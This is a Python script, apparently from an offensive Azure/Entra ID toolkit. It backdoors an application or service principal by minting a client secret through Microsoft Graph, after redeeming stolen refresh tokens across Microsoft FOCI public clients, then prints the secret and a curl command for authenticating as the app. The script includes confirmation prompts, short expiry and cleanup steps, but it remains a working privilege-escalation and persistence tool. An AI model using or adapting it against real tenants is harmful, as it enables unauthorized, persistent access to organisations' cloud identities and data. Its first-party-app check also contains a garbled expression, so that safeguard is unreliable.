#!/usr/bin/env python3
"""
add_app_credential.py - add (or remove) a password credential on an application
or service principal, given a token with Application.ReadWrite.All.

This is the write step of the app-write / secret-gated chains in
roadrecon_privesc.py: with Application.ReadWrite.All you mint a secret onto a
privileged SP, then authenticate AS it (client credentials) and inherit its
application permissions. HIGH IMPACT and persistent - this is how attackers
backdoor an app.

SAFEGUARDS (deliberate - this writes a long-lived credential to the directory):
  * reads and prints the target first (you confirm what you're backdooring);
  * refuses Microsoft first-party apps;
  * SHORT default validity (1 day) to limit blast radius;
  * a tagged default displayName so the credential is auditable/cleanable;
  * typed-'yes' confirmation unless --yes;
  * prints the keyId + the exact --remove-key command for cleanup.

    python3 add_app_credential.py --token "$AT" --target <appId-or-objectId>
    python3 add_app_credential.py --token "$AT" --target <id> --remove-key <keyId> --yes
"""

import argparse
import datetime
import json
import re
import sys
import urllib.parse

import requests

GRAPH = "https://graph.microsoft.com/v1.0"
GUID_RE = re.compile(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")

# Public FOCI clients to redeem a refresh token as (no secret needed). A FOCI
# refresh token is interchangeable across the family, but a given RT may be
# bound to one member or a client may be CA-blocked, so we try them in order.
DEFAULT_FOCI_CLIENT = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
FOCI_CLIENTS = [
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Microsoft Azure CLI"),
    ("1950a258-227b-4e31-a9cf-717495945fc2", "Microsoft Azure PowerShell"),
    ("14d82eec-204b-4c2f-b7e8-296a70dab67e", "Microsoft Graph PowerShell"),
    ("1b730954-1685-4b74-9bfd-dac224a7b894", "Azure Active Directory PowerShell"),
    ("d1ddf0e4-d672-4dae-b554-9d5bdfd93547", "Microsoft Intune PowerShell"),
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
]

# Resource to redeem a refresh token for. Per-script (Graph vs ARM); NOT part of
# the CI-enforced shared block, so it may differ across helpers.
REDEEM_SCOPE = "https://graph.microsoft.com/.default offline_access"


def _read_source(value, is_file, label):
    """Resolve a token from a literal, '-' (stdin), or a file path."""
    if value == "-":
        raw = sys.stdin.read().strip()
    elif is_file:
        with open(is_file, "r", encoding="utf-8") as f:
            raw = f.read().strip()
    else:
        raw = (value or "").strip()
    if not raw:
        return None
    if raw.lower().startswith("bearer "):
        raw = raw[7:].strip()
    # tolerate a tokens.jsonl line: pull the right field for this source
    if raw.startswith("{"):
        try:
            obj = json.loads(raw)
            raw = obj.get("refresh_token" if label == "refresh" else "access_token", raw)
        except ValueError:
            pass
    return raw


def _try_redeem(rt, client_id, tenant):
    """One redemption attempt. Returns (access_token, None) or (None, error)."""
    url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
    data = {
        "grant_type": "refresh_token",
        "client_id": client_id,
        "refresh_token": rt,
        "scope": REDEEM_SCOPE,
    }
    try:
        r = requests.post(url, data=data, timeout=30)
    except requests.RequestException as e:
        return None, f"request error: {e}"
    if r.status_code == 200:
        at = r.json().get("access_token")
        return (at, None) if at else (None, "no access_token in response")
    try:
        err = r.json()
        return None, f"{err.get('error')}: {err.get('error_description', '')[:200]}"
    except ValueError:
        return None, f"HTTP {r.status_code}: {r.text[:200]}"


def redeem_refresh_token(rt, client_id, tenant, fallback=True):
    """Exchange a (FOCI) refresh token for a Graph access token via a public
    client. Tries the chosen client first, then the rest of the FOCI family
    until one succeeds."""
    names = dict(FOCI_CLIENTS)
    order = [client_id] + [c for c, _ in FOCI_CLIENTS if c != client_id] if fallback else [client_id]
    last = None
    for cid in order:
        at, err = _try_redeem(rt, cid, tenant)
        if at:
            label = names.get(cid, cid)
            print(f"[*] redeemed refresh token via {label} ({cid}), tenant {tenant}.", file=sys.stderr)
            return at
        last = err
        print(f"[-] {names.get(cid, cid)} ({cid}) failed: {err}", file=sys.stderr)
    sys.exit(f"[!] refresh-token redemption failed against all {len(order)} client(s). Last: {last}")


def read_token(args):
    if args.refresh_token or args.refresh_token_file:
        rt = _read_source(args.refresh_token, args.refresh_token_file, "refresh")
        if not rt:
            sys.exit("[!] no refresh token provided.")
        return redeem_refresh_token(rt, args.client_id, args.tenant, fallback=not args.no_fallback)
    tok = _read_source(args.token, args.token_file, "access")
    if not tok:
        sys.exit("[!] no token provided (use --token / --token-file / --token -, or --refresh-token).")
    return tok


# --- target resolution & credential ops ---

def graph_get(session, url):
    r = session.get(url, timeout=30)
    if r.status_code == 401:
        sys.exit("[!] 401 Unauthorized - token expired, wrong audience, or revoked.")
    if r.status_code == 403:
        sys.exit(f"[!] 403 Forbidden - token lacks Application.ReadWrite.All.\n    {r.text[:300]}")
    r.raise_for_status()
    return r.json()


def resolve_target(session, ident, as_sp):
    """Return (kind, graph_id, displayName, appId, is_ms_first_party). kind is
    'applications' or 'servicePrincipals' (the Graph collection to act on)."""
    coll = "servicePrincipals" if as_sp else "applications"
    # objectId direct
    if GUID_RE.match(ident):
        try:
            o = graph_get(session, f"{GRAPH}/{coll}/{ident}")
            return coll, o["id"], o.get("displayName"), o.get("appId"), bool(o.get("microsoftFirstPartyApp") or o.get("isFallbackPublicClient") is None and False)
        except requests.HTTPError:
            pass  # not an objectId of that type; try appId filter
    filt = urllib.parse.quote(f"appId eq '{ident}'", safe="")
    hits = graph_get(session, f"{GRAPH}/{coll}?$filter={filt}").get("value", [])
    if not hits:
        sys.exit(f"[!] no {coll[:-1]} found for id/appId {ident!r} "
                 f"({'try without --sp' if as_sp else 'try --sp for a service principal'}).")
    o = hits[0]
    return coll, o["id"], o.get("displayName"), o.get("appId"), bool(o.get("microsoftFirstPartyApp"))


def main():
    ap = argparse.ArgumentParser(description="Add/remove a password credential on an application or service principal.")
    ap.add_argument("--token", help="Graph access token string, or '-' for stdin.")
    ap.add_argument("--token-file", help="File with the access token (or a tokens.jsonl line).")
    ap.add_argument("--refresh-token", help="Refresh token to redeem (FOCI), or '-' for stdin. Overrides --token.")
    ap.add_argument("--refresh-token-file", help="File with a refresh token (or a tokens.jsonl line).")
    ap.add_argument("--client-id", default=DEFAULT_FOCI_CLIENT, help="FOCI public client to try FIRST (default: Azure CLI).")
    ap.add_argument("--tenant", default="organizations", help="Tenant for redemption (default: organizations).")
    ap.add_argument("--no-fallback", action="store_true", help="Only try --client-id, no FOCI fallback.")
    ap.add_argument("--target", required=True, help="Target app: appId or objectId.")
    ap.add_argument("--sp", action="store_true", help="Act on the servicePrincipal object instead of the application.")
    ap.add_argument("--days", type=int, default=1, help="Validity of the new secret in days (default: 1).")
    ap.add_argument("--name", default=None, help="displayName for the secret (default: tagged assessment-<utc>).")
    ap.add_argument("--remove-key", help="Remove the credential with this keyId instead of adding (cleanup).")
    ap.add_argument("--yes", action="store_true", help="Skip the typed confirmation.")
    args = ap.parse_args()

    if args.days > 30 and not args.remove_key:
        sys.exit("[!] refusing --days > 30; a backdoor secret should be short-lived. Lower it or edit the script deliberately.")

    token = read_token(args)
    session = requests.Session()
    session.headers.update({"Authorization": f"Bearer {token}", "Accept": "application/json"})

    coll, oid, name, appid, ms = resolve_target(session, args.target, args.sp)
    if ms:
        sys.exit(f"[!] '{name}' is a Microsoft first-party app - refusing (and Graph would reject it anyway).")

    print(f"[*] target: {name}  ({coll[:-1]} objectId {oid}, appId {appid})")

    if args.remove_key:
        if not args.yes and input(f"    remove credential {args.remove_key} from {name}? [type 'yes'] ").strip().lower() != "yes":
            sys.exit("[*] aborted.")
        r = session.post(f"{GRAPH}/{coll}/{oid}/removePassword", json={"keyId": args.remove_key}, timeout=30)
        if r.status_code in (204, 200):
            print(f"[+] removed credential {args.remove_key} from {name}.")
        else:
            sys.exit(f"[!] remove failed ({r.status_code}): {r.text[:300]}")
        return

    end = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=args.days)
    dname = args.name or f"assessment-{datetime.datetime.now(datetime.timezone.utc):%Y%m%dT%H%M%SZ}"
    print(f"[!] This ADDS a client secret to '{name}', valid {args.days} day(s) (expires {end:%Y-%m-%d %H:%M}Z).")
    print(f"    Anyone with it can authenticate AS this app and inherit its permissions. High impact + persistent.")
    if not args.yes and input("    proceed? [type 'yes'] ").strip().lower() != "yes":
        sys.exit("[*] aborted.")

    body = {"passwordCredential": {"displayName": dname, "endDateTime": end.isoformat().replace("+00:00", "Z")}}
    r = session.post(f"{GRAPH}/{coll}/{oid}/addPassword", json=body, timeout=30)
    if r.status_code not in (200, 201):
        sys.exit(f"[!] addPassword failed ({r.status_code}): {r.text[:300]}")
    cred = r.json()
    print(f"[+] added secret to {name}:")
    print(f"      client_id (appId): {appid}")
    print(f"      secret           : {cred.get('secretText')}")
    print(f"      keyId            : {cred.get('keyId')}")
    print(f"      expires          : {cred.get('endDateTime')}")
    print(f"\n[i] authenticate as the app:")
    print(f"      curl -s https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token \\")
    print(f"        -d grant_type=client_credentials -d client_id={appid} \\")
    print(f"        -d client_secret='{cred.get('secretText')}' -d scope=https://graph.microsoft.com/.default")
    print(f"\n[i] CLEANUP when done:")
    print(f"      python3 add_app_credential.py --target {appid}{' --sp' if args.sp else ''} --remove-key {cred.get('keyId')} --yes  (with a valid token)")


if __name__ == "__main__":
    main()
